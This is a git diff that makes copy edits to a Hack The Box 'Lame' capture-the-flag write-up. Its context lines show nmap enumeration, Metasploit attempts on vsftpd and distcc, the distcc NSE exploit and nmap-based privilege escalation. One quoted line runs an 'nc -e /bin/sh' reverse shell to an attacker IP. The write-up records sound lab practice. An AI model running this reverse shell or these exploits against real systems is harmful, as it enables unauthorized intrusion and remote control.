@@ -1,7 +1,3 @@
----
-title: "Hack The Box - Lame"
-date: 2023-09-16
----
 ## Description
 Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.
 
@@ -13,7 +9,7 @@ Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 11:43 CEST
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 Nmap done: 1 IP address (0 hosts up) scanned in 3.60 seconds
 ```
-It seems ping are blocked so I try again with `-Pn` as suggested:
+It seems ping are blocked, so I try again with `-Pn` as suggested:
 ```
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 11:44 CEST
 Nmap scan report for 10.129.151.43
@@ -175,7 +171,7 @@ RHOSTS => 10.129.151.43
 [*] 10.129.151.43:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
 ```
-I tried to look at different payloads but it seems I do not have many choices:
+I tried to look at different payloads, but it seems I do not have many choices:
 ```
 [msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> show payloads
 
@@ -388,7 +384,7 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 380.73 seconds
 ```
-We know that there is two shares with anonymous access: IPC and tmp. There is also different accounts that are not disabled: msfadmin and user.
+We know that there are two shares with anonymous access: IPC and tmp. There is also different accounts that are not disabled: `msfadmin` and user.
 Anonymous login to these shares seem to fail:
 ```
 ┌─[✗]─[pierre@parrot]─[~/Documents/htb/machines/lame]
@@ -445,10 +441,10 @@ I do not know what to do with this information.
 
 ### SSH
 The SSH server version is OpenSSH 4.7p1. According to a GitHub script, it seems this version is vulnerable: https://github.com/pankajjarial360/OpenSSH_4.7p1
-However, by reading the exploit, it seems to run a bruteforce using MetaSploit and a default wordlist. I do not see how this could exploit anything. I run it just to be sure but I have no hope.
+However, by reading the exploit, it seems to run a bruteforce using MetaSploit and a default wordlist. I do not see how this could exploit anything. I run it just to be sure, but I have no hope.
 
-### distcc
-distcc seems to have a vulnerability that could be exploit using MetaSploit:
+### `distcc`
+`distcc` seems to have a vulnerability that could be exploited using MetaSploit:
 ```
 [msf](Jobs:0 Agents:0) >> search exploit distcc
 
@@ -478,7 +474,7 @@ rhosts => 10.129.106.70
 ```
 I tried different payloads but no one seems to work.
 
-According to hacktricks, nmap has a script to exploit the vulnerability: https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc
+According to [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc), nmap has a script to exploit the vulnerability.
 ```
 $wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
 --2023-09-18 18:57:43--  https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
@@ -540,7 +536,7 @@ sh-3.2$ cat /home/makis/user.txt
 3[...SNIP...]0
 ```
 ## Privilege escalation
-I will run linpeas.sh to check if a vulnerability could help to escalate to root. First of all, I will run a Python HTTP server on a folder containing linpeas.sh:
+I will run linpeas.sh to check if a vulnerability could help to escalate to root. First, I will run a Python HTTP server on a folder containing linpeas.sh:
 ```
 $ls
 linpeas.sh
@@ -639,7 +635,7 @@ e[...SNIP...]9
 Thanks to the interactive mode of nmap, I am able to execute any commands as root, so I can get the flag!
 ## Learning from other writeups
 ### Official writeup
-In the official writeup, the Samba service is exploited using a RCE vulnerability (CVE-2007-2447). A metasploit exploit (`multi/samba/usermap_script`) exists to exploit this vulnerability in less than 10 seconds. Then, you're logged as root and you can get both flags. The question now is why I missed this. I did a search on the samba exploits on metasploit but I was not able to say if the exploit was applicable:
+In the official writeup, the Samba service is exploited using an RCE vulnerability (CVE-2007-2447). A metasploit exploit (`multi/samba/usermap_script`) exists to exploit this vulnerability in less than 10 seconds. Then, you're logged as root, and you can get both flags. The question now is why I missed this. I did a search on the samba exploits on metasploit, but I was not able to say if the exploit was applicable:
 ```
 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> search exploit samba
 
@@ -669,7 +665,7 @@ Matching Modules
    18  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
    19  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
 ```
-We can see the exploit at line 6 but how could I guess this script was applicable to this Samba server? Should I read all exploit information one by one?
+We can see the exploit at line 6, but how could I guess this script was applicable to this Samba server? Should I read all exploit information one by one?
 Well, I could find it using `searchsploit`:
 ```
 $searchsploit samba
@@ -684,15 +680,15 @@ I think I missed it because I search for `smb` and not `samba`.
 ### 0xdf writeup
 In 0xdf writeup, there is an explanation on why the exploit for the vsftpd server fails. It seems to be due to the firewall. There is also a demo to check it: https://0xdf.gitlab.io/2020/04/07/htb-lame.html#beyond-root---vsftpd
 
-There is also a writeup on the distcc exploit that I used: https://0xdf.gitlab.io/2020/04/08/htb-lame-more.html
-I like the remote shell command which is more simpler than me:
+There is also a writeup on the `distcc` exploit that I used: https://0xdf.gitlab.io/2020/04/08/htb-lame-more.html
+I like the remote shell command which is simpler than me:
 ```
 nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.14.24 443'"
 ```
-There are also multiple ways to get privilege escalation. The first one is by using a vulnerability on how the root SSH key has been generated (see CVE-2008-0166). It makes the key predictible and you can get the private key back from the public key.
-I had been a little bit lucky (and helped by the syntax coloration of linpeas.sh) to guess that nmap could be used to get privilege escalation. However, there is the GTFOBins website that can be used to find how to escalate privilege with different binaries: https://gtfobins.github.io/
+There are also multiple ways to get privilege escalation. The first one is by using a vulnerability on how the root SSH key has been generated (see CVE-2008-0166). It makes the key predictable, and you can get the private key back from the public key.
+I had been a bit lucky (and helped by the syntax coloration of linpeas.sh) to guess that nmap could be used to get privilege escalation. However, there is the GTFOBins website that can be used to find how to escalate privilege with different binaries: https://gtfobins.github.io/
 ## Lessons learned
-I could break this box so much quickly. I lost time on the Samba server, trying to connect and looking into the files in it. I also missed the distcc open port at first because I focused on the vulnerable FTP server without finishing the enumaration.
+I could break this box so much quickly. I lost time on the Samba server, trying to connect and looking into the files in it. I also missed the `distcc` open port at first because I focused on the vulnerable FTP server without finishing the enumeration.
 In the future:
 * I should do a proper enumeration first by looking at the data available and what could be possible to exploit without doing right now,
 * I should read carefully the logs of the scan,
